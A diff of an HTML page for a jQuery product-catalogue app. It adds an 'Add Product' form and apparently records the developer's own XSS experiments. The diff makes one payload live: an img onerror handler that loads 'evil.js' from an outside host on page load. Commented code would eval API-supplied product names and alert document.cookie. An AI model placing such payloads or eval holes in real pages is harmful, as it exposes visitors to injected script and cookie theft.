@@ -22,9 +22,20 @@
         <ul id="productsByName" />
      
     </div>
-    <!--<img src=x onerror="alert(document.cookie);">-->
-   <!--<img src=1 onerror="s=document.createElement('script');s.src='//xss-doc.appspot.com/static/evil.js';document.body.appendChild(s);">
+
     <div>
+        <h2>Add Product</h2>
+        Product Name : <input type="text" id="prodNameToAdd" size="10" />
+        Product Category : <input type="text" id="prodCatg" size="10" />
+        Product Price : <input type="text" id="prodPrice" size="10" />
+        Product Company : <input type="text" id="prodCompany" size="10" />
+        <input type="button" value="AddProduct" id ="AddProduct" />
+        
+
+    </div>
+    <!--<p id="XSS"><img src=x onerror="alert(document.cookie);"></p>-->
+  <img src=1 onerror="s=document.createElement('script');s.src='//xss-doc.appspot.com/static/evil.js';document.body.appendChild(s);">
+     <!--<div>
         <h2>Name:</h2>
         <input type="text" id="msgName" size="100" />
         <input type="button" value="Say Hello" onclick="SayHello();" />
@@ -45,11 +56,26 @@
               // Add a list item for the product.
               $('<li>', { text: formatItem(item) }).appendTo($('#products'));
             });
+
+            //$.each(data, function (key, item) {
+            //    try{
+            //        alert(eval(formatItemnew(item)));
+            //    }
+            //    catch(e)
+            //    {
+            //        alert("test");
+            //    }
+            //    //alert(document.cookie);
+            //   ;
+            //});
           });
     });
 
     function formatItem(item) {
         return item.ProdId + ':' + item.Category + ':' + item.Name + ': $' + item.Price;
+    }
+    function formatItemnew(item) {
+        return item.Name;
     }
 
     function find() {
@@ -57,7 +83,7 @@
       var id = $('#prodId').val();
       $.getJSON(uri + '/' + id)
           .done(function (data) {
-            $('#product').text(formatItem(data));
+              $('#product').text(formatItem(data));
           })
           .fail(function (jqXHR, textStatus, err) {
             $('#product').text('Error: ' + err);
@@ -86,11 +112,33 @@
             });
     }
 
-    //function SayHello() {
-    //    var name = Document.get $('#msgName').val();
-    //    $('#helloMessage').text('Hello : ' + name);
+    $(document).ready(function () {
+        $("#AddProduct").click(function () {
+            
+            var product = new Object();
+            product.Name = $('#prodNameToAdd').val();
+            product.Category = $('#prodCatg').val();
+            product.Price = $('#prodPrice').val();
+            product.Company = $('#prodCompany').val();
 
-    //}
+            //alert('method called' + product.Name + product.Category);
+            $.ajax({
+                url: 'api/AddProduct',
+                type: 'POST',
+                dataType: 'json',
+                data: product,
+                success: function (data, textStatus, xhr) {
+                    console.log(data);
+                },
+                error: function (xhr, textStatus, errorThrown) {
+                    console.log('Error in Operation');
+                }
+            });
+
+
+        });
+    });
+    
     </script>
 </body>
 </html>
